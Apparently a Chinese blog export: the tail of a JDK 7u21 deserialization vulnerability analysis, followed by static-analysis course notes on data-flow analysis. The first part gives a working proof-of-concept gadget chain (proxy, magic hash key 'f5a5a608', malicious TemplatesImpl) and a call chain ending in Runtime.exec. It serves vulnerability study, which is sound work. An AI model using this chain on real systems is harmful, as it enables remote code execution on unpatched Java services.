<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static int memberValueHashCode(Object var0) &#123;</span><br><span class="line">        Class var1 = var0.getClass();</span><br><span class="line">        if (!var1.isArray()) &#123; // 匹配到该条件</span><br><span class="line">            return var0.hashCode();</span><br><span class="line">        &#125; else if (var1 == byte[].class) &#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果 Entry 的 value 的 Class 不为 Array，则 <code>memberValueHashCode()</code> 函数返回 <code>value.hashCode()</code>，在这里相当于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127 * key.hashCode() ^ value.hashCode();</span><br></pre></td></tr></table></figure>

<p>为了让最后返回的 <code>result</code> 和 <code>value.hashCode()</code> 相同，这就要求</p>
<ul>
<li><code>memberValues</code> 仅有一个 entry，否则 for 循环内每次计算的结果会累加</li>
<li><code>key.hashCode()</code> 的值为0，从而 127 * key.hashCode() = 0，0 和 任何数异或还是原值</li>
<li>value 和 之前添加到 hashset 的对象相同， (利用代码中该值为包含恶意代码的 templates 对象)</li>
</ul>
<p>前面提到字符串 <code>f5a5a608</code> 的 hashCode 为 0，所以这里只要让 <code>AnnotationInvocationHandler</code> 的 <code>memberValues</code> 内只放一个 key 为字符串 <code>f5a5a608</code>，value 为包含恶意代码的 <code>templates</code> 对象即可</p>
<p>到这里，就可以写出完整的利用代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testPoc</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">        setFieldValue(invocationHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// value 先放入任意值，让 HashSet.add(proxy) 成功</span></span><br><span class="line">        map.put(magicStr, <span class="string">"foo"</span>);</span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line">        Templates evilTemplates = getEvilTemplates();</span><br><span class="line">        HashSet target = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        target.add(evilTemplates);</span><br><span class="line">        target.add(proxy);</span><br><span class="line">        <span class="comment">// 放入实际的 value</span></span><br><span class="line">        map.put(magicStr, evilTemplates);</span><br><span class="line"></span><br><span class="line">        String filename = <span class="string">"/tmp/jdk7u21"</span>;</span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(filename));</span><br><span class="line">        oos.writeObject(target);</span><br><span class="line">        <span class="comment">// 反序列化, boom</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化过程的方法调用链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">LinkedHashSet.readObject()</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      TemplatesImpl.hashCode() (X)</span><br><span class="line">  LinkedHashSet.add()</span><br><span class="line">    ...</span><br><span class="line">      Proxy(Templates).hashCode() (X)</span><br><span class="line">        AnnotationInvocationHandler.invoke() (X)</span><br><span class="line">          AnnotationInvocationHandler.hashCodeImpl() (X)</span><br><span class="line">            String.hashCode() (<span class="number">0</span>)</span><br><span class="line">            AnnotationInvocationHandler.memberValueHashCode() (X)</span><br><span class="line">              TemplatesImpl.hashCode() (X)</span><br><span class="line">      Proxy(Templates).equals()</span><br><span class="line">        AnnotationInvocationHandler.invoke()</span><br><span class="line">          AnnotationInvocationHandler.equalsImpl()</span><br><span class="line">            Method.invoke()</span><br><span class="line">              ...</span><br><span class="line">                 <span class="comment">// TemplatesImpl.getOutputProperties()，实际测试时会直接调用 newTransformer()</span></span><br><span class="line">                  TemplatesImpl.newTransformer()</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TemplatesImpl.defineTransletClasses()</span><br><span class="line">                        ClassLoader.defineClass()</span><br><span class="line">                        Class.newInstance()</span><br><span class="line">                          ...</span><br><span class="line">                            MaliciousClass.&lt;clinit&gt;()</span><br><span class="line">                              ...</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure>



<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/AnnotationInvocationHandler-fix.png" alt="image"></p>
<p>在 jdk &gt; 7u21 的版本，修复了这个漏洞，看了下 7u79 的代码，<code>AnnotationInvocationHandler</code> 的 <code>readObject()</code> 方法增加了异常抛出，导致反序列化失败。</p>
<p>参考：</p>
<p><a href="https://xz.aliyun.com/t/8050" target="_blank" rel="noopener">1</a></p>
<p><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/" target="_blank" rel="noopener">2</a></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>【南京大学-软件分析】课程笔记</title>
    <url>/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>返景入深林，复照青苔上。</p>
</blockquote>
<p>越来越发现基础知识的重要，前一阵又跟着老师过了一遍，理解更加深入了，顺便整理笔记。</p>
<a id="more"></a>

<h1 id="01"><a href="#01" class="headerlink" title="01"></a>01</h1><h2 id="PL：Programming-Language"><a href="#PL：Programming-Language" class="headerlink" title="PL：Programming Language"></a>PL：Programming Language</h2><p>理论：语言设计，类型系统，语义和逻辑 </p>
<p>环境：编译器，运行系统</p>
<p>应用：程序分析，程序验证，程序合成</p>
<p>技术：抽象解释（Abstract interpretation），数据流分析（Data-flow analysis），Hoare logic，Model checking，Symbolic execution等等</p>
<p><strong>静态分析作用</strong>：程序可靠性、程序安全性、编译优化、程序理解（调用关系、类型识别）。</p>
<h2 id="Soundness-amp-Completeness"><a href="#Soundness-amp-Completeness" class="headerlink" title="Soundness &amp; Completeness"></a>Soundness &amp; Completeness</h2><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817120652100.png" alt="image-20200817120652100"></p>
<p>解释：</p>
<p>Truth：理论上的既sound又complete的概念。它代表着所有的程序的特点。假如说程序存在10个空指针应用的异常，那么truth的定义就是10，但是莱斯定理表明，并不存在这样的一个方法可以把这所有的10个异常都检查出来。Truth其实就是那个理论上的最优结果。</p>
<p>Sound：对程序进行过拟合，over-approximate，不会漏报，但是会有误报false positives</p>
<p>Complete：对程序进行欠拟合，under-approximate，不会误报，但是会有漏报false negatives</p>
<p>妥协soundness，相当于sound圈变小了，会造成漏报false negatives；</p>
<p>妥协completeness，相当于complete圈变大了，会造成误报false positives；</p>
<p>几乎所有的静态分析都会妥协completeness，宁愿误报也不要漏报！</p>
<p>很多重要领域如军工、航天领域，我们追求的是soundness，但是要平衡精度和速度。那么我们绝大多数软件分析方法都做到了completeness，那么只要能证明满足soundness，那么该分析方法就是正确的。</p>
<h1 id="02"><a href="#02" class="headerlink" title="02"></a>02</h1><h2 id="编译器与静态分析的关系"><a href="#编译器与静态分析的关系" class="headerlink" title="编译器与静态分析的关系"></a>编译器与静态分析的关系</h2><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200816162005843.png" alt="image-20200816162005843"></p>
<ol>
<li><p>源码</p>
</li>
<li><p>Scanner-词法分析LexicalAnalysis-正则表达式RegularExpression</p>
<p>这一环中，判断每一个单词是否是合理的，合理的话就转换为Tokens，给下一步继续分析。</p>
</li>
<li><p>Parser-语法分析SyntaxAnalysis-上下文无关文法Context-Free Grammar</p>
<p>这一环中，语法分析主要是判断语法是否合理，类似符合英语的“主谓宾”结构。</p>
<p>这里用到一套形式化的结构就是上下文无关文法。</p>
<p>生成语法树。</p>
<p>为什么不用上下文敏感的语法来参与分析？</p>
<p>答：就目前编程语言来说，上下文无关文法已经足够了。</p>
<p>​        如果用上下文关联的语法，杀鸡用40米的牛刀，它更适合分析人讲的自然语言。</p>
<p>​        弱表达能力的使用起来速度更快，效率更高。</p>
</li>
<li><p>Type Checker-语义检测Semantic Analysis-Attribute Grammar</p>
<p>根据上一步生成的AST抽象语法树，编译器会进行一点特别简单的语义检查，例如Type-Checking类型检查。</p>
<p>简单判断变量类型，例如float不能赋值给int。</p>
<p>生成圣诞树。Decorated AST</p>
</li>
<li><p>Translator-生成中间表示代码IR-进行静态分析，优化</p>
<p>IR普遍是三地址码，进行优化，安全检查。</p>
<p>最后生成machine code机器码。</p>
</li>
</ol>
<p><strong>IR称为编译器前端</strong>，对于检查安全漏洞来说，必须要先把前端的检查都通过了，再去挑错，否则如果连基本的程序编译都无法通过，那么继续调漏洞也将毫无意义。</p>
<h2 id="AST-vs-IR"><a href="#AST-vs-IR" class="headerlink" title="AST vs. IR"></a>AST vs. IR</h2><p><strong>AST</strong> ：高级，更接近于语法结构，依赖于语言种类，适用于快速类型检查，缺少控制流信息。</p>
<p><strong>IR</strong>：低级，更接近于机器码，不依赖语言种类，压缩且简洁，包含控制流信息。是静态分析的基础。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200816170139381.png" alt="image-20200816170139381"></p>
<h2 id="3AC-3地址码"><a href="#3AC-3地址码" class="headerlink" title="3AC-3地址码"></a>3AC-3地址码</h2><p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200816173735317.png" alt="image-20200816173735317"></p>
<h2 id="soot"><a href="#soot" class="headerlink" title="soot"></a>soot</h2><p>soot用得是typed 3AC 是在3AC内部存在类型的形式 Jimple：typed 3-address code</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200816192800941.png" alt="image-20200816192800941"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// java IR（Jimple）基本知识</span></span><br><span class="line">invokespecial：call constructor, call superclass methods, call <span class="keyword">private</span> methods</span><br><span class="line">invokevirtual: <span class="function">instance methods <span class="title">call</span> <span class="params">(virtual dispatch)</span> 派生</span></span><br><span class="line"><span class="function">invokeinterface: cannot optimization, checking interface implementation</span></span><br><span class="line"><span class="function">invokestatic:call <span class="keyword">static</span> methods</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Java 7: invokedynamic -&gt; Java <span class="keyword">static</span> typing, dynamic language runs on JVM</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">method signature: class name, return type, method <span class="title">name</span><span class="params">(parameter1_type, parameter2_type)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line"><span class="function">clinit是类的初始化复制</span></span><br><span class="line"><span class="function">  Class A</span>&#123;</span><br><span class="line">   B b = ...<span class="comment">//会调用B的clinit方法，给类属性复制</span></span><br></pre></td></tr></table></figure>



<h2 id="BasicBlock-BB-基本块"><a href="#BasicBlock-BB-基本块" class="headerlink" title="BasicBlock BB 基本块"></a>BasicBlock BB 基本块</h2><p><strong>定义</strong>：只有唯一1个开头入口和唯一1个结尾出口的<strong>最长</strong>3-地址指令序列。</p>
<p><strong>识别基本块的算法</strong>：</p>
<p>首先确定入口指令，第一条指令是入口；</p>
<p>任何跳转指令的目标地址是入口；</p>
<p>任何跟在跳转指令之后的指令是入口。</p>
<p>然后构造基本块，任何基本块包含1个入口指令和其接下来的指令。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200816223026303.png" alt="image-20200816223026303"></p>
<h2 id="CFG-Control-Flow-Graph"><a href="#CFG-Control-Flow-Graph" class="headerlink" title="CFG Control Flow Graph"></a>CFG Control Flow Graph</h2><p><strong>控制流边</strong>：</p>
<p>基本块A的结尾有跳转指令跳转到基本块B；</p>
<p>原始指令序列中，B紧跟着A，且A的结尾不是无条件跳转。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817113112671.png" alt="image-20200817113112671"></p>
<h1 id="03"><a href="#03" class="headerlink" title="03"></a>03</h1><h2 id="Data-Flow-Analysis"><a href="#Data-Flow-Analysis" class="headerlink" title="Data Flow Analysis"></a>Data Flow Analysis</h2><p>总结：</p>
<p>数学符号形式化表示；</p>
<p>数据流分析其实就是在CFG上分析。</p>
<p>绝大部分静态分析都是牺牲了completeness，去追求soundness。放弃了速度，去追求精度。</p>
<p>首先对数据进行抽象，形式化表达；</p>
<p>接下来对程序进行over-approximation，过拟合，也就是说程序在运行中所有可能产生的值，都要在静态分析时候去考虑到。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817152249362.png" alt="image-20200817152249362"></p>
<p>May-analysis：输出信息可能是正确的，相当于已经做了over-approximation过拟合；</p>
<p>Must-analysis：输出信息必须是正确的，准确的，相当于已经做了under-approxiamtion欠拟合；</p>
<p>may-analysis：绝大部分静态分析都是may，会有误报</p>
<p>must-analysis：会有漏报</p>
<p>一般来说：</p>
<p>May都是union，初始化都是空，bottom</p>
<p>Must都是intersection。初始化是all，top</p>
<p>三要素：Nodes (BBs/statements)、Edges (control flows)、CFG (a program)</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817152835145.png" alt="image-20200817152835145"></p>
<p>不同的数据流分析 有 不同的数据<strong>抽象表达</strong> 和 不同的<strong>安全近似策略</strong>，如 不同的 <strong>转换规则</strong> 和 <strong>控制流</strong>处理。</p>
<h2 id="数据流分析预备知识"><a href="#数据流分析预备知识" class="headerlink" title="数据流分析预备知识"></a>数据流分析预备知识</h2><p><strong>输入/输出状态</strong>：程序执行前/执行后的状态（本质就是抽象表达的数据的状态，如变量的状态）。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817153034289.png" alt="image-20200817153034289"></p>
<p><strong>数据流分析的结果</strong>：最终得到，每一个程序点对应一个数据流值(data-flow value)，表示该点所有可能程序状态的一个抽象。例如，我只关心x、y的值，我就用抽象来表示x、y所有可能的值的集合（输入/输出的值域/约束），就代表了该程序点的程序状态。</p>
<p><strong>Transfer Funtion</strong>：</p>
<p>转换函数，约束规则。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817153731110.png" alt="image-20200817153731110"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Forward Analysis前向分析：按程序执行顺序的分析。OUT[s]=fs(IN[s])，s-statement</span><br><span class="line">Backward Analysis反向分析：逆向分析。IN[s]=fs(OUT[s])</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817154222620.png" alt="image-20200817154222620"></p>
<h2 id="Reaching-Definitions-Analysis"><a href="#Reaching-Definitions-Analysis" class="headerlink" title="Reaching Definitions Analysis"></a>Reaching Definitions Analysis</h2><p><strong>Forward &amp; MAY</strong></p>
<p><strong>问题定义</strong>：在p点给变量v一个定义d（赋值），存在一条路径使得程序点p能够到达q，且在这个过程中v不能被重新赋值。</p>
<p>May：不放过任何一条path，需要over来保证safe</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210504213858048.png" alt="image-20210504213858048"></p>
<p><strong>应用举例</strong>：检测未定义的变量，若v可达p且v没有被定义，则为未定义的变量。</p>
<p><strong>抽象表示</strong>：设程序有n条赋值语句，用n位向量来表示能reach与不能reach。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><strong>Transfer Function</strong>：OUT[B] = genB U (IN[B] - killB) </p>
<p><strong>解释</strong>：基本块B的输出 = B内的所有变量v的定义（赋值/修改）语句  U （基本块B的输入-程序中其它所有定义v的地方）。本质就是本块与前驱修改变量的语句 作用之和（去掉前驱中已经定义的语句）。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817155923509.png" alt="image-20200817155923509"></p>
<p>简单例子：</p>
<p>以第一个基本块为例，gen就是d1,d2,d3三个定义语句，kill需要杀掉的就是在d1,d2,d3中定义的变量(i,j,a)在别处也被定义的语句，图里就是d4、d5、d6、d7，他们四个都需要被kill掉。</p>
<p><strong>Control Flow</strong>：IN[B] = UNIONp a_predecesso_of_B Out[P] ——怎么理解，就是基于控制流而得到。</p>
<p><strong>解释</strong>：基本块B的输入 = 块B所有前驱块P的输出的<strong>并集</strong>。注意，所有前驱块意味着只要有一条路径能够到达块B，就是它的前驱，包括条件跳转与无条件跳转，所以需要搞并集union。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817160542369.png" alt="image-20200817160542369"></p>
<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><p><strong>目的</strong>：输入CFG，计算好每个基本块的killB（程序中其它块中定义了变量v的语句）和genB（块B内的所有变量v的定义语句），输出每个基本块的IN[B]和OUT[B]。</p>
<p><strong>方法</strong>：首先所有基本块的OUT[B]初始化为空。遍历每一个基本块B，按以上两个公式计算块B的IN[B]和OUT[B]，只要这次遍历时有某个块的OUT[B]发生变化，则重新遍历一次（因为程序中有循环存在，只要某块的OUT[B]变了，就意味着后继块的IN[B]变了）。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817160753583.png" alt="image-20200817160753583"></p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p><strong>抽象表示</strong>：设程序有n条赋值语句，用n位向量来表示能reach与不能reach。</p>
<p><strong>说明</strong>：红色-第1次遍历；蓝色-第2次遍历；绿色-第3次遍历。<strong>针对等号左边的变量，先kill，再gen。</strong></p>
<p><strong>结果</strong>：3次遍历之后，每个基本块的OUT[B]都不再变化。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200817164924402.png" alt="image-20200817164924402"></p>
<p>现在，我们可以回想一下，数据流分析的目标是，最后得到了，每个程序点关联一个数据流值（该点所有可能的程序状态的一个抽象表示，也就是这个n位向量）。在这个过程中，对每个基本块，不断利用基于转换规则的语义（也就是transfer functions，构成基本块的语句集）-<code>OUT[B]</code>、控制流的约束-<code>IN[B]</code>，最终得到一个稳定的安全的近似约束集。</p>
<h3 id="停止条件"><a href="#停止条件" class="headerlink" title="停止条件"></a>停止条件</h3><p>OUT[B] = genB U (IN[B] - killB)</p>
<p><strong>理解</strong>：genB和 killB是不变的，只有IN[B]在变化，所以说OUT[B]只会增加不会减少，程序的定义是有限的，所以最终肯定会停止。in决定out，out又决定in。</p>
<p>看下面这张图：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20210504223358055.png" alt="image-20210504223358055"></p>
<p>每一次迭代，IN都会加入更多的程序facts，这些facts要么被kill掉、要么成为surviors进入到OUT中。</p>
<p>不论是gen还是surviors，留在OUT中就会一直stay，也就是OUT永远不会缩减。</p>
<p>程序定义点也是有限的，就会导致OUT最终不会变化，算法一定会停止。</p>
<h1 id="04"><a href="#04" class="headerlink" title="04"></a>04</h1><h2 id="Live-Variables-Analysis"><a href="#Live-Variables-Analysis" class="headerlink" title="Live Variables Analysis"></a>Live Variables Analysis</h2><p><strong>Backward &amp; May</strong></p>
<p><strong>问题定义</strong>：某程序点p处的变量v，从p开始到exit块的CFG中是否有某条路径用到了v，如果用到了v，则v在p点为live，否则为dead。<strong>其中有一个隐含条件，在点p和引用点之间不能重定义v</strong>。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200819145537874.png" alt="image-20200819145537874"></p>
<p><strong>应用场景</strong>：可用于寄存器分配，如果寄存器满了，就需要替换掉不会被用到的变量。</p>
<p><strong>抽象表示</strong>：程序中的n个变量用长度为n bit的向量来表示，对应bit为1，则该变量为live，反之为0则为dead。</p>
<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><strong>Control Flow</strong>：OUT[B] = US a_successor_of_BIN[S]</p>
<p><strong>理解</strong>：逆向分析，只要有一条path是live，父节点就是live。</p>
<p><strong>Transfer Function</strong>：IN[B] = useB U (OUT[B] - defB)</p>
<p><strong>理解</strong>：IN[B] = 本块中use出现在define之前的变量 U （OUT[B]出口的live情况 - 本块中出现了define的变量）。define指的是定义/赋值。</p>
<p>IN[B] = useB U (OUT[B] - defB)</p>
<p>IN[B] 其实想看的是哪些变量在进入B之前就已经是live的，那么分为以下两种情况：</p>
<p>第一种是在B中从定义之前就被引用的，useB。</p>
<p>第二种是针对outB来说，逆向分析，如果想知道哪些在进入B之前就是live的，那么就需要从outB中减去那些在B中被重定义的那些，它们就是defB。</p>
<p>两种情况取并集，<strong>先killB，再useB。</strong> <strong>kill等号左边的local，gen右边的locals。</strong></p>
<p><strong>特例分析</strong>：如以下图所示，第4种情况，v=v-1，实际上use出现在define之前，v是使用的。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820134652089.png" alt="image-20200820134652089"></p>
<h3 id="算法-1"><a href="#算法-1" class="headerlink" title="算法"></a>算法</h3><p><strong>初始化规律</strong>：一般情况下，may analysis 全部初始化为空，must analysis全部初始化为all。</p>
<p><strong>目的</strong>：输入CFG，计算好每个基本块中的defB（重定义）和useB（出现在重定义之前的使用）。输出每个基本块的IN[B]和OUT[B]。</p>
<p><strong>方法</strong>：首先初始化每个基本块的IN[B]为<strong>空集</strong>。遍历每一个基本块B，按以上两个公式计算块B的OUT[B]和IN[B]，只要这次遍历时有某个块的IN[B]发生变化，则重新遍历一次（因为有循环，只要某块的IN[B]变了，就意味前驱块的OUT[B]变了）。</p>
<p><strong>问题</strong>：遍历基本块的顺序有要求吗？ 没有要求，但是会影响遍历的次数。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200819173409266.png" alt="image-20200819173409266"></p>
<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><p><strong>抽象表示</strong>：程序中的n个变量用长度为n bit的向量来表示，对应bit为1，则该变量为live，反之为0则为dead。</p>
<p><strong>说明</strong>：从下往上遍历基本块，黑色-初始化；红色-第1次；蓝色-第2次；绿色-第3次。<strong>先kill左边的def，再gen右边的use。</strong></p>
<p><strong>结果</strong>：3次遍历后，IN[B]不再变化，遍历结束。</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200819231636245.png" alt="image-20200819231636245"></p>
<h2 id="Available-Expression-Analysis"><a href="#Available-Expression-Analysis" class="headerlink" title="Available Expression Analysis"></a>Available Expression Analysis</h2><p><strong>Forward &amp; MUST</strong></p>
<p><strong>问题定义</strong>：</p>
<p>程序点p处的表达式<code>x op y</code>可用需满足2个条件：</p>
<ol>
<li>从entry到p点的<strong>所有路径</strong>都必须经过<code>x op y</code></li>
<li>在最后一次使用<code>x op y</code>之后，没有重定义操作数x、y。（如果重定义了x 或 y，如x = <code>a op2 b</code>，则原来的表达式<code>x op y</code>中的x或y就会被替代）。</li>
</ol>
<p><strong>应用场景</strong>：用于优化，检测全局公共子表达式。</p>
<p><strong>抽象表示</strong>：程序中的n个<strong>表达式</strong>，用长度为n bit的向量来表示，1表示可用，0表示不可用。</p>
<h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><strong>Transfer Function</strong>：OUT[B] = genB U (IN[B] - killB)</p>
<p><strong>理解</strong>：</p>
<p>genB：基本块B中所有新的表达式（并且在这个表达式之后，不能对表达式中出现的变量进行重定义）–&gt;加入到OUT；killB：从IN中删除和被重新定义变量有关的表达式。</p>
<p><strong>Control Flow</strong>：</p>
<p><img src="../images/%E3%80%90%E5%8D%97%E4%BA%AC%E5%A4%A7%E5%AD%A6-%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E3%80%91%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/image-20200820135804188.png" alt="image-20200820135804188"></p>
<p><strong>理解</strong>：从entry到p点的<strong>所有路径</strong>都必须经过该表达式。</p>
<p><strong>问题</strong>：该分析为什么属于must analysis呢？因为我们<strong>允许有漏报，不能有误报</strong>，比如以上示例中，改为x=3，去掉 b=e16*x，该公式会把该表达式识别为不可用。但事实是可用的，因为把x=3替换到表达式中并不影响该表达式的形式。这里虽然漏报了，但是不影响程序分析结果的正确性。</p>
